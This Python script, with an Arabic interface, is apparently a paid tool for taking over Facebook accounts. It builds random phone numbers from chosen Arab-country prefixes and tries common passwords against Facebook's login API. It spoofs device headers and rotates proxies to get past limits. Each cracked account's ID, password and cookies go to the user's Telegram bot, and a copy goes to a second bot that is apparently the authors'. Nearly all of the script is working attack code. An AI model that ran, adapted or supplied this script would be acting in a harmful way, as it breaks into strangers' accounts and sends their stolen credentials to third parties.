import random, os, sys
try:
    import colorama
    import cython
    import zipfile
    import shutil
except ImportError:
    os.system('pip3.11 install colorama')
    os.system('pip3.9 install colorama')
    os.system('pip install shutil')
    os.system('pip install cython')
    os.system('pip install zipfile')
    import colorama
import time
from colorama import Fore, Style
import random
os.system('clear')
import time
import webbrowser

# ألوان ANSI
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"

webbrowser.open('https://t.me/R7Aih1')

time.sleep(3)

input(f"{BOLD}{YELLOW}اضغط Enter للمتابعة...{RESET}")

print(f"{BOLD}{RED}عليك الاشتراك بالقناة للمتابعة{RESET}")

webbrowser.open('https://t.me/ali313eme')
import os, sys, requests, random, json, time, uuid
from concurrent.futures import ThreadPoolExecutor as r
HH='\033[1;34m'
M = '\x1b[1;36m'
from datetime import datetime

SUBSCRIPTIONS_URL = "https://github.com/lm9011109t-pixel/Facebook-/raw/refs/heads/main/subscriptions.json"
PROXIES_URL = "https://github.com/lm9011109t-pixel/Facebook-/raw/refs/heads/main/proxies.txt"
USER_AGENTS_URL = "https://github.com/lm9011109t-pixel/Facebook-/raw/refs/heads/main/User-Agent.txt"

xp = f"\033[1;34m<[\033[1;36m●\033[1;34m]>\033[1;36m"
xp1 = f"\033[1;34m<[\033[1;36m1\033[1;34m]>\033[1;36m"
xp2 = f"\033[1;34m<[\033[1;36m2\033[1;34m]>\033[1;36m"
xp3 = f"\033[1;34m<[\033[1;36m3\033[1;34m]>\033[1;36m"
xp4 = f"\033[1;34m<[\033[1;36m4\033[1;34m]>\033[1;36m"
xp5 = f"\033[1;34m<[\033[1;36m5\033[1;34m]>\033[1;36m"
xp0 = f"\033[1;34m<[\033[1;36m0\033[1;34m]>\033[1;36m"
xpx = f"\033[1;34m<[\033[1;36m?\033[1;34m]>\033[1;36m"
xpxx = f"\033[1;34m>\033[1;36m>\033[1;34m>\033[1;36m"
xlinex = (f"\033[1;34m━\033[1;36m━"*28)

def check_subscription(code):
    try:
        print(f"\033[1;36m[CHECKING] Verifying subscription code...\033[0m")
        response = requests.get(SUBSCRIPTIONS_URL, timeout=30)
        if response.status_code == 200:
            data = json.loads(response.text)
            
            if data.get('maintenance', False):
                print(f"{xp} الصيانة جارية حالياً")
                return False
            
            if code in data:
                code_data = data[code]
                if code_data['status'] == 'active':
                    expiry_date = datetime.strptime(code_data['expiry'], '%Y-%m-%d')
                    current_date = datetime.now()
                    
                    if current_date <= expiry_date:
                        print(f"{xp} ✓ Code is valid")
                        print(f"{xp} Expiry: {code_data['expiry']}")
                        return True
                    else:
                        print(f"{xp} ✗ Code has expired")
                        return False
                else:
                    print(f"{xp} ✗ Code is inactive")
                    return False
            else:
                print(f"{xp} ✗ Invalid code")
                return False
        else:
            print(f"\033[1;31m[ERROR] Cannot access subscriptions file - Status code: {response.status_code}\033[0m")
            print(f"\033[1;31m[ERROR] Please check your internet connection and try again\033[0m")
            return False
    except requests.exceptions.Timeout:
        print(f"\033[1;31m[ERROR] Timeout while checking subscription\033[0m")
        return False
    except requests.exceptions.ConnectionError:
        print(f"\033[1;31m[ERROR] Connection error while checking subscription\033[0m")
        print(f"\033[1;31m[ERROR] Please check your internet connection\033[0m")
        return False
    except Exception as e:
        print(f"\033[1;31m[ERROR] Error checking subscription: {e}\033[0m")
        return False

def load_proxies_from_file(filepath):
    proxies = []
    try:
        print(f"\033[1;36m[LOADING] Loading proxies from {filepath}...\033[0m")
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line:
                    proxies.append(line)
        if proxies:
            print(f"\033[1;32m[SUCCESS] Loaded {len(proxies)} proxies from file\033[0m")
        else:
            print(f"\033[1;31m[ERROR] No proxies found in file\033[0m")
        return proxies
    except FileNotFoundError:
        print(f"\033[1;31m[ERROR] File not found: {filepath}\033[0m")
        print(f"\033[1;31m[ERROR] Please make sure the file exists at the specified path\033[0m")
        return []
    except Exception as e:
        print(f"\033[1;31m[ERROR] Failed to load proxies: {e}\033[0m")
        return []

def load_proxies_from_remote():
    proxies = []
    try:
        print(f"\033[1;36m[DOWNLOADING] Loading proxies from remote...\033[0m")
        response = requests.get(PROXIES_URL, timeout=30)
        if response.status_code == 200:
            for line in response.text.splitlines():
                line = line.strip()
                if line:
                    proxies.append(line)
            if proxies:
                print(f"\033[1;32m[SUCCESS] Loaded {len(proxies)} proxies from remote\033[0m")
            else:
                print(f"\033[1;31m[ERROR] No proxies found in remote file\033[0m")
            return proxies
        else:
            print(f"\033[1;31m[ERROR] Failed to download proxies file\033[0m")
            return []
    except Exception as e:
        print(f"\033[1;31m[ERROR] Failed to load remote proxies: {e}\033[0m")
        return []

def load_user_agents():
    user_agents = []
    try:
        print(f"\033[1;36m[DOWNLOADING] Loading User-Agents from remote...\033[0m")
        response = requests.get(USER_AGENTS_URL, timeout=30)
        if response.status_code == 200:
            for line in response.text.splitlines():
                line = line.strip()
                if line:
                    user_agents.append(line)
            if user_agents:
                print(f"\033[1;32m[SUCCESS] Loaded {len(user_agents)} User-Agents\033[0m")
            else:
                print(f"\033[1;31m[ERROR] No User-Agents found in file\033[0m")
            return user_agents
        else:
            print(f"\033[1;31m[ERROR] Failed to download User-Agents file\033[0m")
            print(f"\033[1;33m[WARNING] Will use default User-Agent\033[0m")
            return []
    except Exception as e:
        print(f"\033[1;31m[ERROR] Failed to load User-Agents: {e}\033[0m")
        print(f"\033[1;33m[WARNING] Will use default User-Agent\033[0m")
        return []

print(f"""
{xp} ENTER YOUR SUBSCRIPTION KEY:
{xlinex}
{xpx} KEY: {xpxx}""", end=' ')

subscription_code = input().strip()

if not check_subscription(subscription_code):
    print(f"\033[1;31m[ERROR] Invalid or expired subscription code\033[0m")
    print(f"\033[1;31m[ERROR] Tool will now exit...\033[0m")
    sys.exit()

print(f"\033[1;32m[SUCCESS] Subscription verified! Continuing...\033[0m")
print(xlinex)

token = input("\033[1;36mادخل توكن البوت: \033[0m")
chat_id = input("\033[1;36mادخل ID: \033[0m")

welcome_caption = """
لشراء الادوات المدفوعة تواصل مع المطورين 
PY : @p7s7s + @R7_36
القنوات : @ali313eme + @R7Aih1 
"""

video_url = "https://t.me/aali313eme/416"

try:
    print(f"\033[1;36m[CONNECTING] Verifying Telegram bot...\033[0m")
    response = requests.post(
        f"https://api.telegram.org/bot{token}/sendVideo",
        data={
            "chat_id": chat_id,
            "video": video_url,
            "caption": welcome_caption
        },
        timeout=30
    )
    if response.status_code == 200:
        print("\033[1;34m نجح التحقق منك\033[0m")
    else:
        print(f"\033[1;31m[ERROR] Failed to send verification message - Status code: {response.status_code}\033[0m")
        print(f"\033[1;31m[ERROR] Please check your token and ID\033[0m")
except requests.exceptions.Timeout:
    print(f"\033[1;31m[ERROR] Timeout while connecting to Telegram\033[0m")
except requests.exceptions.ConnectionError:
    print(f"\033[1;31m[ERROR] Connection error while connecting to Telegram\033[0m")
    print(f"\033[1;31m[ERROR] Please check your internet connection\033[0m")
except Exception as e:
    print("\033[1;36m❌ خطاء في التحقق:\033[0m", e)

G = "\x1b[38;5;27m"
R = "\x1b[38;5;93m"
W = "\x1b[38;5;196m"
B = "\x1b[38;5;21m"
Y = "\x1b[38;5;99m"
A = "\x1b[38;5;57m"
O = "\x1b[38;5;63m"
X = "\x1b[38;5;129m"
P = "\x1b[38;5;135m"
PS = "\x1b[38;5;220m"
CRIMSON_DARK = "\033[38;5;18m"
CRIMSON = "\033[38;5;27m"
CRIMSON_LIGHT = "\033[38;5;99m"
CRIMSON_BRIGHT = "\033[38;5;63m"
RED = "\033[38;5;129m"

id, ok, loop = [], 0, 0
total_requests = 0
successful_requests = 0
failed_requests = 0
failed_proxies = []

android_versions = ["10", "11", "12", "13", "14"]
devices = [
    "TECNO CK7n",
    "Samsung SM-G991B",
    "Xiaomi Redmi Note 12",
    "Infinix X6812",
    "Huawei Y9a"
]
brands = {
    "TECNO CK7n": "TECNO",
    "Samsung SM-G991B": "Samsung",
    "Xiaomi Redmi Note 12": "Xiaomi",
    "Infinix X6812": "Infinix",
    "Huawei Y9a": "Huawei"
}
android = random.choice(android_versions)
device = random.choice(devices)
brand = brands[device]

fbav = f"{random.randint(200,400)}.0.0.{random.randint(1,200)}.{random.randint(1,150)}"
fbbv = random.randint(100000000,999999999)

width = random.choice([720, 1080, 1440])
height = random.choice([1600, 1920, 2172, 2400])
density = random.choice([2.0, 2.5, 3.0, 4.0])

user_agents = load_user_agents()
if user_agents:
    ua = random.choice(user_agents)
else:
    ua = f"""Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/{fbav};FBBV/{fbbv};FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/{brand};FBBD/{brand};FBDV/{device};FBSV/{android};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"""

headers = {
    "User-Agent": ua,
    "Accept-Encoding": "gzip, deflate",
    "x-fb-connection-quality": "EXCELLENT",
    "x-fb-friendly-name": "authenticate",
    "x-fb-http-engine": "Liger",
    "x-fb-client-ip": "True",
    "x-fb-server-cluster": "True",
    "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
}

version ='2.0'

countries_data = {
    "1": {"name": "Algeria", "codes": ["055", "056", "066", "067", "077", "079"]},
    "2": {"name": "Saudi Arabia", "codes": ["050", "053", "054", "055", "056", "058"]},
    "3": {"name": "UAE", "codes": ["050", "052", "054", "055", "056", "058"]},
    "4": {"name": "Qatar", "codes": ["330", "331", "332", "333", "334", "335"]},
    "5": {"name": "Kuwait", "codes": ["500", "503", "505", "506", "507", "509"]},
    "6": {"name": "Oman", "codes": ["710", "712", "714", "715", "716", "718"]},
    "7": {"name": "Bahrain", "codes": ["310", "311", "312", "313", "314", "315"]},
    "8": {"name": "Egypt", "codes": ["010", "011", "012", "015", "016", "017"]},
    "9": {"name": "Morocco", "codes": ["600", "601", "602", "603", "604", "605"]},
    "10": {"name": "Jordan", "codes": ["070", "071", "072", "077", "078", "079"]},
    "11": {"name": "Lebanon", "codes": ["030", "031", "032", "033", "034", "035"]},
    "12": {"name": "Iraq", "codes": ["0750", "0770", "0780"]},
    "13": {"name": "Tunisia", "codes": ["200", "201", "202", "203", "204", "205"]},
    "14": {"name": "Syria", "codes": ["090", "091", "092", "093", "094", "095"]},
    "15": {"name": "Yemen", "codes": ["700", "701", "702", "703", "704", "705"]},
    "16": {"name": "Libya", "codes": ["910", "911", "912", "913", "914", "915"]},
    "17": {"name": "Sudan", "codes": ["090", "091", "092", "093", "094", "095"]},
    "18": {"name": "Palestine", "codes": ["050", "051", "052", "053", "054", "055"]},
    "19": {"name": "Mauritania", "codes": ["410", "411", "412", "413", "414", "415"]},
    "20": {"name": "Somalia", "codes": ["060", "061", "062", "063", "064", "065"]},
    "21": {"name": "Djibouti", "codes": ["770", "771", "772", "773", "774", "775"]},
    "22": {"name": "Comoros", "codes": ["320", "321", "322", "323", "324", "325"]}
}

FIXED_TOKEN = ""
FIXED_ID = ""

proxies = []
use_proxies = False

Logo = f"""
\033[1;34m●─────━PS + zeus──━●
\033[1;34m╱╱╭━━━┳━┳━━━┳━╮
\033[1;36m╭━┫╭━╮┃━┫╭━╮┃━┫
\033[1;34m┃╋┣╯╭╯┣━┣╯╭╯┣━┃
\033[1;36m┃╭╯╱┃╭┻━╯╱┃╭┻━╯
\033[1;34m╰╯╱╱┃┃╱╱╱╱┃┃

\033[1;36m  ×─> \033[1;36m━━━━━━━\033[1;34m━━━━━━━━━━\033[1;36m━━━━━━━━━━━━\033[1;36m━━━━━\033[1;34m━━━━━━\033[1;36m━━━━━ <─×"""

def display_logo():
    os.system('clear')
    print(Logo)
    print(f"""\033[1;36m  ×─> \033[1;34m━━━━━\033[1;36m━━━━━━━━\033[1;34m━━━━━━\033[1;36m━━━━━━━━━━━\033[1;36m━━━━━━━━\033[1;34m━━━━━━━ <─×
{xlinex}
\033[1;36m  DEVELOPER {xpxx} PS+ zeus\033[1;34m-\033[1;36m
\033[1;36m  STATUS    {xpxx} Premium
\033[1;36m  VERSION   {xpxx} V\033[1;34m/\033[1;36m{version}
{xlinex}
\033[1;34m 𝐷𝐸𝑉 𝑃𝑆 | @p7s7s + @ali313eme8 
\033[1;34m 𝐷𝐸𝑉 zeus | @R7Aih1 + @R7Aih1 
{xlinex}
{xp} FUTURES  {xpxx} FILE\033[1;34m〤\033[1;36mCLONE
{xp} DEV {xpxx} PS ~ @p7s7s • zeus ~ @R7_36
{xp}trust    {xpxx} @ali313eme8 + @R7Aih1
{xlinex}""")

def show_countries():
    
    for key, country in countries_data.items():
        codes_str = " | ".join(country["codes"])
        print(f"\033[1;34m[\033[1;36m{key}\033[1;34m] \033[1;36m{country['name']} \033[1;34m➜ \033[1;36m{codes_str}")
    
    print(f"\033[1;34m{'='*50}\033[1;36m\n")

def get_network_code():
    show_countries()
    
    choice = input(f'{xp} Select the country number (1-22)  {xpxx} ').strip()
    
    if choice in countries_data:
        country = countries_data[choice]
        print(f"{xp}I have chosen: \033[1;34m{country['name']}\033[1;36m")
        print(f"{xp}Available codes: \033[1;34m{' | '.join(country['codes'])}\033[1;36m")
        
        sim = input(f'{xp} INPUT CHOSE ({ " | ".join(country["codes"]) }) {xpxx} ').strip()
        
        if sim in country["codes"]:
            return sim
        else:
            print(f"{xp} \033[1;36m⚠️ الكود غير صحيح! سيتم استخدام الإدخال اليدوي...\033[1;36m")
            return input(f'{xp} INPUT CHOSE (مثال: 0750 | 0770 | 0780) {xpxx} ').strip()
    else:
        return input(f'{xp} INPUT CHOSE (مثال: 0750 | 0770 | 0780) {xpxx} ').strip()

def choose_proxy_mode():
    global proxies, use_proxies
    display_logo()
    print(f"{xp1} Use proxy from file (/storage/emulated/0/csrf.txt)")
    print(f"{xp2} Use proxy from tool")
    print(f"{xp3} No proxy")
    choice = input(f'{xp} Choose proxy mode {xpxx} ').strip()
    
    if choice == "1":
        proxies = load_proxies_from_file('/storage/emulated/0/csrf.txt')
        if proxies:
            print(f"{xp} Loaded {len(proxies)} proxies from file")
            use_proxies = True
        else:
            print(f"{xp} ✗ No proxies found in file")
            use_proxies = False
    elif choice == "2":
        proxies = load_proxies_from_remote()
        if proxies:
            print(f"{xp} Loaded {len(proxies)} proxies from tool")
            use_proxies = True
        else:
            print(f"{xp} ✗ No proxies available")
            use_proxies = False
    else:
        use_proxies = False
        print(f"{xp} No proxy selected")

def menu():
    global TOKEN, ID
    display_logo()
    
    TOKEN = input(f'{xp}  TOKEN {xpxx} ').strip()
    print(xlinex)
    
    ID = input(f'{xp} ID {xpxx} ').strip()
    print(xlinex)
    
    choose_proxy_mode()
    print(xlinex)
    
    sim = get_network_code()
    print(xlinex)
    
    print(f"\033[1;32m[STARTING] Tool is starting...\033[0m")
    print(xlinex)
    
    for _ in range(44444):
        nmp = "".join(random.choice('1234509876') for ing in range(7))
        id.append(nmp)
    
    with r(max_workers=30) as am:
        display_logo()
        for idx in id:
            ids = sim + str(idx)
            pwxs = [
                ids,
                str(idx),
                "123456",
                "1234567",
                "12345678",
                "123456789",
                "12341234",
                "12344321"
                
            ]
            am.submit(crackfree, ids, pwxs)
    
    print('')
    print('\033[1;36m\033[1m-'*45)
    print('Crack Completed')
    exit()

def crackfree(ids, pwxs):
    global ok, loop, total_requests, successful_requests, failed_requests, failed_proxies, use_proxies
    sys.stdout.write(f'\r\r\r\033[1;36m\033[1m{xp} \033[1;34m<[\033[1;36mPS-{loop}\033[1;34m]> \033[1;34m<[\033[1;36mOK-{ok}\033[1;34m]> \033[1;34m<[\033[1;36mREQ-{total_requests}\033[1;34m]> \033[1;34m<[\033[1;36mSUCCESS-{successful_requests}\033[1;34m]>'),
    sys.stdout.flush()
    
    for pw in pwxs:
        try:
            data = pm(ids, pw)
            total_requests += 1
            
            req = None
            if use_proxies and proxies:
                proxy = random.choice(proxies)
                proxy_dict = {
                    'http': proxy,
                    'https': proxy
                }
                try:
                    req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data, proxies=proxy_dict, timeout=10)
                    if req.status_code == 407 or req.status_code == 402:
                        failed_proxies.append(proxy)
                        if len(failed_proxies) >= len(proxies):
                            print(f"\r\r\033[1;33m[WARNING] All proxies failed! Switching to direct connection...\033[0m")
                            use_proxies = False
                        req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data, timeout=10)
                except:
                    failed_proxies.append(proxy)
                    if len(failed_proxies) >= len(proxies):
                        print(f"\r\r\033[1;33m[WARNING] All proxies failed! Switching to direct connection...\033[0m")
                        use_proxies = False
                    req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data, timeout=10)
            else:
                req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data, timeout=10)
            
            if req.status_code == 200:
                successful_requests += 1
                try:
                    req_json = req.json()
                    if 'session_key' in req_json:
                        uid = req_json["uid"]
                        ok += 1
                        coki = get_cookies(ids, pw)
                        
                        print(f"\r\r\033[0;32m\033[1m{xp} \033[1;34m<[PS-OK\033[1;34m]> {uid} | {pw}   ")
                        print(xlinex)
                        
                        m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

❖ - COOKIES : {coki}

ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @p7s7s +  ~ PS 
DEV :: @R7_36 +  ~ zeus
 trust » t.me/ali313eme8
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
                        
                        PS_m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

❖ - COOKIES : {coki}

tg://openmessage?user_id={ID}
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @p7s7s +  ~ PS 
DEV :: @R7_36 +  ~ zeus
 trust » t.me/ali313eme8
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
                        
                        send_telegram(TOKEN, ID, m)
                        send_telegram(FIXED_TOKEN, FIXED_ID, PS_m)
                        
                        break
                        
                    elif 'www.facebook.com' in req_json.get("error", {}).get("message", ""):
                        uid = req_json["error"]["error_data"]["uid"]
                        
                        print(f"\r\r\x1b[38;5;208m\033[1m{xp}\033[1;34m<[PS-CP\033[1;34m]>\033[0;32m\033[1m {uid} | {pw}   ")
                        print(xlinex)
                        
                        m = f"""حساب شغال من PS ✅
     

❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @p7s7s +  ~ PS 
DEV :: @R7_36 +  ~ zeus
 trust » t.me/ali313eme8
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
                        
                        PS_m = f"""حساب شغال من PS ✅


❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

tg://openmessage?user_id={ID}
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @p7s7s +  ~ PS 
DEV :: @R7_36 +  ~ zeus
 trust » t.me/ali313eme8
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
                        
                        send_telegram(TOKEN, ID, m)
                        send_telegram(FIXED_TOKEN, FIXED_ID, PS_m)
                        
                        break
                except json.JSONDecodeError:
                    failed_requests += 1
            else:
                failed_requests += 1
                
        except requests.exceptions.ConnectionError:
            failed_requests += 1
            time.sleep(1)
        except requests.exceptions.Timeout:
            failed_requests += 1
        except requests.exceptions.RequestException:
            failed_requests += 1
        except Exception:
            failed_requests += 1
    
    loop += 1

def pm(email_or_phone, password):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    secure_family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{password}"
    
    if user_agents:
        headers['User-Agent'] = random.choice(user_agents)
    
    payload = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": email_or_phone,
        "password": pwd_enc,
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": family_device_id,
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    }
    return payload

def send_telegram(bot_token, chat_id, message):
    try:
        requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={
                "chat_id": chat_id,
                "text": message
            }
        )
    except:
        pass

def get_cookies(email_or_phone, password):
    return "cookies_placeholder"

menu()